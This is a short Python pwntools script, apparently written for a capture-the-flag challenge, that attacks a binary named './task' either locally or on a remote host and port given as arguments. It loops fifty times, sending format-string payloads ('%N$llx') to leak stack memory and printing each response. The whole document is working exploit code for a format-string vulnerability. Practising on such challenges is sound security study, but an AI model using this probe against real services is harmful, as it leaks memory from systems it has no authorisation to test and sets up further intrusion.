from pwn import *
import os
#64 bit
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe], *a, **kw)

exe = './task'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'

for i in range(50):
    sh = start()
    print("iter: ", i)
    sh.sendlineafter(b'?', '%{}$llx'.format(i))
    get = sh.recvline()
    string = str(get)
    print(string)

sh.interactive()
